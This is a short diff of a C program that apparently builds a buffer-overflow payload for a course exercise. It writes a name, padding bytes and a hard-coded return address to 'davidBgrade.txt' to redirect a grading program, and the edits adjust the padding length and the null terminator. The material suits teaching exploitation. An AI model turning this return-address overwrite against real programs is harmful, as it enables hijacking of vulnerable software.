@@ -12,7 +12,7 @@ stored x30
 int main() {
     unsigned int uiData;
     char name[] = "David";
-    char whitespace[] = "6767676767676767676767676767676767676767676";
+    char whitespace[] = "676767676767676767676767676767676767676767";
     long returnAddress = 0x400890;
 
     FILE *psFile = fopen("davidBgrade.txt", "w");
@@ -22,7 +22,7 @@ int main() {
         return 1; 
     }
 
-    fwrite(&name, strlen(name), 1, psFile); /* Check case that this does not return */
+    fwrite(&name, strlen(name) + 1, 1, psFile); /* Check case that this does not return */
     fwrite(&whitespace, strlen(whitespace), 1, psFile);
     fwrite(&returnAddress, sizeof(long), 1, psFile);
 
